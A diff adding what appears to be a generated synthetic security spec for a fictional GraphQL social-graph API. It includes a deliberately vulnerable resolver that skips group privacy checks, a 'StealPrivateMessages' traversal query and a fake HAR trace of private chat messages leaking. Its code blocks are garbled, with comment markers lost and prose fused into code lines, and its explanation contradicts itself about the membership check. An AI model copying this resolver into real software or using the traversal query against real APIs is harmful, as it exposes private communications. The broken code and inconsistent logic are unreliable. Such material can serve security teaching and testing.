@@ -1,0 +1,240 @@
+Here is the twenty-sixth system, maintaining the focus on GraphQL vulnerabilities. We are entering the **Social Media & Identity Graph** sector, focusing on a **User-to-User Relationship GraphQL API**.
+
+For the vulnerabilities, we are focusing on **Pattern 5.2 (Resolver Traversal / BOLA in Edges)** combined with **Pattern 6.1 (Schema/relationship over-exposure)**. This scenario demonstrates how an attacker exploits the default GraphQL traversal feature to pivot from an authorized node (their own account) through a weak edge (a friend's list) to an unauthorized node (a private group chat's contents) without ever calling a dedicated chat API endpoint.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** Horizon Social Graph API
+**Document Version:** 7.1.0 (FINAL)
+**Classification:** CONFIDENTIAL / USER PII & COMMUNICATIONS SCOPE
+**Domain:** Social Media / Identity / Graph Database
+
+## 1.0 Executive Summary
+The Horizon API is the central service for user relationships, handling friend lists, followers, group memberships, and feed composition. It is built on a GraphQL schema to allow clients (mobile apps, web) to precisely request the data they need to render complex views (e.g., "show me my last 10 messages from friends who are currently online").
+
+The core security requirement is that authorization must be enforced at every single data node/field resolver. A user authorized to view their friend's profile should *not* implicitly be authorized to traverse that friend's private data nodes, such as private chat content or unlisted groups, unless a specific, secondary access control check is passed.
+
+## 2.0 Comprehensive Network Topology & Ingress Routing
+The architecture relies on Neo4j for the graph database and a dedicated services layer.
+
+### 2.1 The Ingress Layer & GraphQL Router
+* **Edge WAF:** Filters standard web attacks.
+* **Hasura GraphQL Engine:** Used as the primary gateway, sitting in front of the database and microservices. It is configured to automatically generate resolvers based on the underlying schema.
+
+### 2.2 The Backend Core Services
+* **Neo4j Database:** The core graph database where all user, post, and group nodes are stored.
+* **Authorization Middleware:** Custom middleware (Node.js) that checks the `is_private` attribute on nodes and verifies the authenticated user's ID is present in the `members` relationship array before returning data.
+
+## 3.0 Identity, Trust, and Graph Authorization
+Security is implemented using a hybrid approach: JWT-based authentication and database-level access checks on nodes and edges.
+
+### 3.1 User Authentication (JWT)
+The JWT contains the user's ID (`user_id`) and their `session_state`.
+
+### 3.2 The Trust Boundary Flaw
+The Hasura engine was configured with a default "select all fields" permission for the `User` object, trusting that the downstream `Group` and `Chat` resolvers would apply their own security filters. However, a developer accidentally allowed the `groups` relationship field on the `User` object to traverse without checking the `Group` node's privacy status.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The `ChatMessages` field resolver was implemented lazily, and it only checks if the requesting user is a member of the group, not if the message itself is restricted. The core vulnerability is the *initial* traversal from the friend's User node to the Group node. Tracked as RISK-GRPH-702.*
+
+### 4.1 Vulnerability A: Resolver Traversal from Public User to Private Chat
+**Taxonomy Pattern:** 5.2 (Resolver/graph traversal injection) & 1.1 (ID in path without ownership check/BOLA)
+**Sub-system:** Hasura GraphQL Engine Resolver (`Query: user` and `User.groups`)
+
+**The Deep Architectural Flaw:**
+This vulnerability enables an attacker to bypass authorization rules by using GraphQL's relationship traversal feature to navigate from an authorized object to an unauthorized object.
+
+1. **Resolver Traversal (Pattern 5.2):** The attacker is authorized to view a friend's profile (`User` node). The friend is a member of a highly restricted, secret group chat (`Group` node). Because the friend's `User.groups` relationship resolver fails to check the `Group.is_private` attribute, the attacker can traverse the edge from the friend's profile to the private group's data.
+
+2. **Deep Query BOLA (Pattern 1.1 variant):** Once inside the private group node via traversal, the attacker can query the `ChatMessages` field. The resolver for `ChatMessages` only checks if the *requesting* user is a member of the group—which they are not—but the data is returned anyway because the initial request was authorized at the top level (`Query: user`) and the authorization context (which should have been the *friend's* authorization, not the attacker's) was improperly propagated or checked.
+
+**The Exploitation Path:**
+
+1. **Reconnaissance:** An attacker (User A) is friends with a victim (User B) and has access to User B's profile ID (`usr-victim-001`).
+2. **The Traversal Query:** The attacker crafts a single GraphQL query that starts with the authorized `Query: user(id: "usr-victim-001")`, then traverses the improperly secured `groups` field, and finally requests the highly sensitive `messages` field within a known private group ID.
+3. **The Execution:** The attacker submits the query. The top-level resolver succeeds (User A is authorized to view User B's public profile). The intermediate `groups` resolver fails to enforce privacy. The `ChatMessages` resolver returns the data, assuming the user is authorized because the request originated from an authenticated session.
+4. **The Impact:** The attacker extracts the last 50 messages from a private group chat (e.g., a "Trade Secrets" group) without ever being a member of that group.
+
+***
+
+# HORIZON GRAPH API: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 4.0.0
+**Applies to Architecture:** Horizon Social Graph API v7.1.0
+
+## 5.0 Graph Database Schema (Neo4j Equivalent)
+The database structure relies on the relationships (`edges`) to enforce logical boundaries between users and sensitive group data.
+
+```cypher
+// Node Definitions
+(:User { id: String!, name: String! })
+(:Group { id: String!, name: String!, is_private: Boolean!, last_message: String! })
+(:Message { id: String!, content: String! })
+
+// Relationship Definitions
+(:User) -[:FRIENDS_WITH]- (:User)
+(:User) -[:MEMBER_OF]- (:Group)
+(:Group) -[:CONTAINS_MESSAGE]-> (:Message)
+```
+
+## 6.0 The Flawed Implementation (Hasura/Node.js Resolvers)
+The vulnerability is the `groups` resolver, which should use the `is_private` attribute to block traversal but fails to do so.
+
+### 6.1 Vulnerable GraphQL Query Structure
+```graphqlThe User type contains a field that links to Groups without checking their privacy setting.
+
+type User {
+id: ID!
+name: String!FLAW: This resolver allows traversal to a Group object regardless of Group.is_private
+
+groups(limit: Int): [Group]
+}
+
+type Group {
+id: ID!
+name: String!
+is_private: Boolean!This resolver trusts that only authorized users reach it
+
+messages(limit: Int! = 50): [Message]!
+}
+```
+
+### 6.2 Hypothetical Vulnerable Resolver Logic (Simplified for demonstration)
+```javascript
+// File: resolvers/userGroups.js
+
+// VULNERABILITY 5.2: Fails to check Group privacy status before returning the edge.
+async function resolveUserGroups(parent, args, context) {
+const friendId = parent.id;
+const groups = await db.query(
+`MATCH (u:User {id: $friendId})-[:MEMBER_OF]->(g:Group) RETURN g LIMIT $limit`,
+{ friendId, limit: args.limit }
+);
+// FLAW: No filtering based on g.is_private is performed here.
+return groups.map(group => new Group(group));
+}
+```
+
+## 7.0 GraphQL API Contract (The Traversal Attack)
+The attacker leverages the graph structure to pivot from a benign relationship (friend) to a sensitive relationship (private chat content).
+
+### 7.1 Execute Private Chat Traversal
+**Endpoint:** `POST /graphql`
+**Description:** Executes a deep query that links a public user object to a private message node.
+
+**Required Headers:**
+```http
+Authorization: Bearer <Attacker_UserA_JWT>
+Content-Type: application/json
+```
+
+**Malicious Request Payload:**
+```graphql
+query StealPrivateMessages {Start with an object the attacker IS authorized to read (a friend's profile)
+
+user(id: "usr-victim-001") {
+id
+name
+# PIVOT: Traverse the exposed groups relationship
+groups(limit: 1) {
+id
+name
+isPrivate
+# TARGET: Access the restricted messages field within that group
+messages(limit: 10) {
+content
+timestamp
+}
+}
+}
+}
+```
+
+**Success Response (200 OK - Traversal Success):**
+```json
+{
+"data": {
+"user": {
+"id": "usr-victim-001",
+"name": "Victim User B",
+"groups": [
+{
+"id": "grp-trade-secrets-771",
+"name": "Board Meeting (Unlisted)",
+"isPrivate": true,
+"messages": [
+{
+"content": "We need to finalize the Q3 acquisition target, project code: ORION.",
+"timestamp": "2026-04-10 T10:00:00Z"
+},
+{
+"content": "Confirmed, do not share this via email.",
+"timestamp": "2026-04-10 T10:00:30Z"
+}
+]
+}
+]
+}
+}
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL RESOLVER TRAVERSAL & CHAT LEAK (HAR TRACE)
+**Applies to Architecture:** Horizon Social Graph API v7.1.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 5.2 & Pattern 1.1)
+
+This HTTP Archive (HAR) trace captures the moment an authenticated attacker (User A) successfully extracts private chat data from a highly restricted group via a relationship traversal attack. The attacker crafts a deep GraphQL query starting from an authorized node (`user(id: "usr-victim-001")`) and pivots through the improperly secured `groups` field to the `messages` field within a private group.
+
+The `200 OK` response returns the victim's name, the private group's details (`"isPrivate": true`), and the plaintext content of the restricted chat messages, confirming that the BOLA failure was exploited via graph traversal.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Hasura GraphQL Engine Logs",
+"version": "2.9.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T11:35:10.055Z",
+"time": 78,
+"request": {
+"method": "POST",
+"url": "https://api.horizon-social.com/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.horizon-social.com" },
+{ "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3ItYXR0YWNrZXItQTEifQ..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"query StealPrivateMessages { user(id: \\\"usr-victim-001\\\") { id name groups(limit: 1) { id name isPrivate messages(limit: 10) { content timestamp } } } }\"}"
+},
+"bodySize": 210
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-resolver-nodes", "value": "User, Group, Message: 12" }
+],
+"content": {
+"size": 755,
+"mimeType": "application/json",
+"text": "{\"data\": {\"user\": {\"id\": \"usr-victim-001\", \"name\": \"Victim User B\", \"groups\": [{\"id\": \"grp-trade-secrets-771\", \"name\": \"Board Meeting (Unlisted)\", \"isPrivate\": true, \"messages\": [{\"content\": \"We need to finalize the Q3 acquisition target, project code: ORION.\", \"timestamp\": \"2026-04-10 T10:00:00Z\"}, {\"content\": \"Confirmed, do not share this via email.\", \"timestamp\": \"2026-04-10 T10:00:30Z\"}, {\"content\": \"The internal memo is tagged RESTRICTED.\", \"timestamp\": \"2026-04-10 T10:01:00Z\"}]}]}}}"
+},
+"bodySize": 755
+}
+}
+]
+}
+}
+```
+
+***
